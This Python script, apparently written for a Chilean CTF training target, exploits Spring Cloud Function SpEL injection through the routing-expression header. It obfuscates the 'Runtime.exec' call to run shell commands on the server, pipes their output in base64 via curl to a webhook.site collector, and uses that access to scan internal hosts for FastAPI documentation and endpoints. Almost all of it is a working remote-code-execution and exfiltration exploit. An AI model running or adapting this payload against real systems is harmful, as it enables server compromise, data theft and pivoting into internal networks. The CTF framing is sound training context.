#!/usr/bin/env python3
"""
CTF Chile - Obtener documentación de APIs FastAPI
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Obteniendo documentación de APIs...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:35} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Obtener esquemas OpenAPI...")

# Obtener la especificación OpenAPI en JSON
hosts = ["10.160.209.1", "10.109.220.1"]

for host in hosts:
    host_safe = host.replace(".", "_")
    probe(f"openapi_{host_safe}", f"curl -s http://{host}:8000/openapi.json 2>/dev/null")

print("[*] FASE 2: Explorar endpoints específicos de FastAPI...")

# Endpoints específicos para APIs FastAPI
fastapi_endpoints = [
    "/openapi.json", "/docs", "/redoc", "/",
    "/items", "/users", "/auth", "/token"
]

for host in hosts:
    for endpoint in fastapi_endpoints:
        host_safe = host.replace(".", "_")
        endpoint_safe = endpoint.replace("/", "_").replace(".", "_")
        if endpoint_safe.startswith("_"):
            endpoint_safe = endpoint_safe[1:]
        probe(f"fastapi_{host_safe}_{endpoint_safe}", f"curl -s -H 'Accept: application/json' http://{host}:8000{endpoint} 2>/dev/null")

print("[*] FASE 3: Probando con curl plano para ver la respuesta completa...")

# Obtener respuestas completas sin procesamiento
for host in hosts:
    host_safe = host.replace(".", "_")
    probe(f"raw_response_{host_safe}", f"curl -s -i http://{host}:8000/openapi.json | head -20")
    probe(f"raw_root_{host_safe}", f"curl -s -i http://{host}:8000/ | head -15")

print("[*] FASE 4: Intentar obtener lista de rutas usando métodos alternativos...")

# Intentar diferentes formas de obtener información de rutas
for host in hosts:
    host_safe = host.replace(".", "_")
    # Probar OPTIONS en la raíz para ver métodos permitidos
    probe(f"options_{host_safe}", f"curl -s -X OPTIONS http://{host}:8000/ -i | head -10")
    # Probar HEAD para ver headers
    probe(f"head_{host_safe}", f"curl -s -X HEAD http://{host}:8000/ -i")

time.sleep(15)

# Recoger y analizar respuestas
print("\n[*] Analizando documentación de APIs...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=15)
data = r.json().get("data", [])

openapi_docs = []
api_endpoints = []
raw_responses = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar documentación OpenAPI
            if "openapi" in path.lower():
                if any(keyword in decoded.lower() for keyword in ["openapi", "paths", "components", "info"]):
                    openapi_docs.append((path, decoded))
                    print("📚 DOCUMENTACIÓN OPENAPI DETECTADA")

            # Detectar respuestas de API interesantes
            if any(keyword in decoded.lower() for keyword in ["json", "application/json", "fastapi"]):
                api_endpoints.append((path, decoded))
                print("🔌 RESPUESTA API")

            # Guardar respuestas raw útiles
            if "raw" in path.lower():
                raw_responses.append((path, decoded))
                print("📄 RESPUESTA RAW")

            # Buscar información de endpoints en el contenido
            if any(keyword in decoded.lower() for keyword in ["path", "get", "post", "endpoint"]):
                if len(decoded.strip()) > 50:
                    print("🛣️  POSIBLE INFORMACIÓN DE RUTAS")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE DOCUMENTACIÓN API")
print("="*70)

if openapi_docs:
    print(f"📚 DOCUMENTACIÓN OPENAPI: {len(openapi_docs)}")
    for path, content in openapi_docs:
        print(f"    📄 {path}")
        print(f"       {content[:200]}...")

if api_endpoints:
    print(f"\n🔌 ENDPOINTS API: {len(api_endpoints)}")
    for path, content in api_endpoints:
        print(f"    - {path}: {content[:100]}...")

if raw_responses:
    print(f"\n📄 RESPUESTAS RAW: {len(raw_responses)}")
    for path, content in raw_responses:
        print(f"    - {path}: {content[:100]}...")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")